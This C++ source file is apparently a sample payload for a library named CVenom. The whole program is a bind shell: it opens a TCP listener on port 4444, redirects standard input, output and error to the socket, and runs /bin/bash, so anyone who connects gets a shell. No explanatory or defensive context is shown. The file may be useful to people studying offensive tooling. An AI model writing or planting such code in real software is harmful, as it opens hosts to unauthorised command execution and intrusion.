#include "../../CVenom.h"
#include "../../NetworkTools.h"
#include "../../RuntimeTools.h"
#include "../../IOTools.h"

int main(int argc, char** argv){
	cvinit(argc, argv);

	IOTools		IOController;
	NetworkTools	Network;
	RuntimeTools	Runner;

	Network.StartTCPServer("127.0.0.1", 4444);

	IOController.Close(INPUT);
	IOController.Close(OUTPUT);
	IOController.Close(ERROR);

	IOController.Redirect( INPUT , Network.Socket() );
	IOController.Redirect( OUTPUT, Network.Socket() );
	IOController.Redirect( ERROR , Network.Socket() );

	Runner.SystemExecute("/bin/bash");

	cvexit(0);
}
